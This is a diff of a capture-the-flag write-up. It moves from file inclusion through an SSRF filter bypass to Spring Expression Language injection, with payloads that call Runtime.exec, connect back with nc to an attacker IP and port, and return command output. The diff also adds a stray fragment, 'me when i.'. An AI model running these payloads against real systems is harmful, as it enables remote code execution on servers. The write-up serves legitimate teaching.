@@ -58,7 +58,7 @@ Checking the presented response it looks like we are on the same folder ("downlo
 
 ![Got our LFI](https://gyazo.com/c0fa593feec6e2c9eea6a9ee1f182c2a.png)
 
-Vwalla! we got 200 OK sent back from the server, following "main.go" source code as promised. Now we must analyze and understand this piece of code, so we can find some flaws.
+Voilà! we got 200 OK sent back from the server, following "main.go" source code as promised. Now we must analyze and understand this piece of code, so we can find some flaws.
 
 ## Analysing the main piece of code
 
@@ -106,7 +106,7 @@ We can see that there are some interesting declarations of global variables, whi
 
 Focusing on the `main()` function shows us the path of each page following their functions.
 
-```
+```golang
 func main() {
 	r := mux.NewRouter()
 
@@ -119,7 +119,7 @@ func main() {
 
 The first function we are going to investigate is the `getResource()` function that is set under "/getResource" page.
 
-```
+```golang
 func getResource(w http.ResponseWriter, r *http.Request) {
 	path := mux.Vars(r)["path"]
 	path = strings.Replace(path, " ", "%20", -1)
@@ -179,7 +179,7 @@ So we get that its a famous hacker (which I personally respect alot), and his re
 
 ![Google search](https://gyazo.com/d9dde342999d41b7524872a66dcddd48.png)
 
-After diging in his ways of bypassing common URL parsers, We can figure out that by adding the "@" sign at the start of `path` parameter, will ingore "127.0.0.1" on the request.
+After exploring his method of bypassing common URL parsers, We can figure out that by adding the "@" sign at the start of `path` parameter, will ingore "127.0.0.1" on the request.
 
 ![Filtering Bypass](https://gyazo.com/fc658ab20e11427a24a180c44fe9008d.png) 
 
@@ -189,7 +189,7 @@ Now that we have got our SSRF working, we must understand how does the `calc()` 
 
 First lets dive into the `calc()` function, and figure out what it does.
 
-```
+```golang
 func calc (w http.ResponseWriter, r *http.Request) {
 	item_id := r.URL.Query().Get("item_id")
 	country_code := r.URL.Query().Get("country_code")
@@ -208,12 +208,13 @@ func calc (w http.ResponseWriter, r *http.Request) {
 
 When analysing the `calc()` function we see that a `POST` request is being sent to `CALCULATION_SERVER`, following three parameters: `item_id`, `country_code`, and `quantity`.
 Sending the request with random numbers actually worked.
+me when i.
 
 ![Sending a request to calc](https://gyazo.com/d5cafc6762797fe0d70708e4d8d2c70d.png)
 
 Hold it! We are trying to send a request with parameters to a different webserver, via "SmartStore" website. So we must URL encode the ampersand "&" which equals to "%26", and by that the second/third parameter will reach to our internal web server, and not to the "SmartStore" webserver.
 
-If We fuzz around with the parameters value, We will notice that `country_code` parameter does not effect the given output, On the other hand `quantity` **does return its value in the response output** when inserting a numeric digits.
+If We fuzz around with the parameters value, We will notice that `country_code` parameter does not effect the given output, On the other hand `quantity` **does return its value in the response output** when inserting numeric digits.
 
 ![Quantity is being returned](https://gyazo.com/8cf7a909ed384e73dfc234978e974460.png)
 
@@ -233,7 +234,7 @@ We can take some time and read an amazing EL Injection in Spring Boot by "deadpo
 So we can try and send a request with an injection that will execute a given command using the java's `Runtime` class, following by the `exec()` method. We will check if we can execute any command.
 We will use the linux `id` command, just to verify that we can execute code on the target webserver.
 
-```
+```java
 T(java.lang.Runtime).getRuntime().exec('id')
 
 ```
@@ -242,7 +243,7 @@ T(java.lang.Runtime).getRuntime().exec('id')
 The request hangs for like 40 seconds, and we dont get any output in the HTTP response, so why not sending a command that doesn't require an HTTP response?
 let's set an "nc" listener, and set `quantity` value to the next payload:
 
-```
+```java
 T(java.lang.Runtime).getRuntime().exec('nc%20IP%20PORT')
 
 ```
@@ -253,7 +254,7 @@ Nice, so we **verified our code execution** on the webserver, lets try and grab 
 So in order to get output in the HTTP Response, we will use the "Spring Framework" `StreamUtils` class and call the `copyToString()` method. We can pass an input stream to this method and get the contents of the stream as a response.
 the finaly payload should look like the following: 
 
-```
+```java
 T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec('ls').getInputStream(),'utf-8')
 ```
 ![Flag via ELi](https://gyazo.com/313633ccdab5e833cd3c120ca34eed08.png)
